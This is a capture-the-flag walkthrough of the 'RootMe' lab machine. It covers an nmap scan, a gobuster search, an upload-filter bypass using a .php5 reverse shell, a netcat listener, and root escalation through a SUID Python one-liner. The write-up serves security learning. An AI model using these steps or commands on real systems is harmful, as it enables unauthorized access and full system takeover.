# RootMe

- Launch **nmap scan**  via `nmap -sC -sV <IP_ADDR>` and get:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ce:c1:e1:45:6d:77:49:6b:34:de:ba:5d:17:5b:b1:d3 (RSA)
|   256 73:d8:e3:6e:5c:83:0b:dd:2f:d4:d5:47:69:d1:ee:6f (ECDSA)
|_  256 03:9a:c1:ac:34:b8:aa:b1:1b:67:1a:af:e2:61:41:7f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home
```

- Hence, there are two open ports (22 and 80). Apache 2.4.41 is running on port 80 and SSH service is running on port 22.

- By running **GoBuster**, via `gobuster dir -u <IP_ADDR> -w /path/to/wordlist -x php,html,css,js,txt` I found out the hidden endpoint */panel/* on the HTTP server, which allows me to upload a file. I also noticed an index.php and uploads/ endpoint. So I start to look for a PHP reverse shell file to upload. By uploading the file `php-reverse-shell.php` I noticed that `.php` files are not permitted. So, I try different variations, like PHP4 or PHP5. PHP5 works!

- Now, I open a listening socket with `nc -lnvp 4444` and I visit `/uploads/` endpoint and open the previously uploaded file.

- Once inside the machine, I need to find the *user.txt* file in this way: `find -name user.txt 2>/dev/null`. The result: `./var/www/user.txt`

- Now, to escalate privileges (finding SUID permissions) I run: `find / -perm -u=s -type f 2>/dev/null`

- I notice that there's `/usr/bin/python` among the results. So I can escalate privileges via Python. I can look for scripts on https://gtfobins.org/

- I could run `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` to escalate to root user. After, I print the flag contained inside `/root/root.txt` 
